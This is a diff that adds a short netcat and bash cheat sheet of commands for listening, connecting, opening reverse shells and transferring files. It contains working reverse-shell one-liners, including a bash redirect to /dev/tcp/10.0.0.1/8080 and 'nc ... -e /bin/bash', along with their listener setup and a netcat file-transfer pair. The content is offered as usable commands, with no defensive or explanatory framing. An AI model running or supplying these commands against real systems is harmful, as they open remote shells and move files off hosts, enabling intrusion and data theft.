@@ -1,0 +1,15 @@
+#### listen for all incoming connections with netcat ####
+ncat -vv -l 0.0.0.0 2222
+### connecting to a Listener ###
+nc ip.to.get.connected port
+#### reverse shell ####
+# bash example 
+bash -i >& /dev/tcp/10.0.0.1/8080 0>&1
+# netcat example
+nc ip.to.get.connected port -e /bin/bash
+#setup the listener for the rev shell 
+nc -nvlp port
+## netcat file transfer 
+nc -l -p 1234 -q 1 > something.zip < /dev/null
+cat something.zip | netcat server.ip.here 1234
+
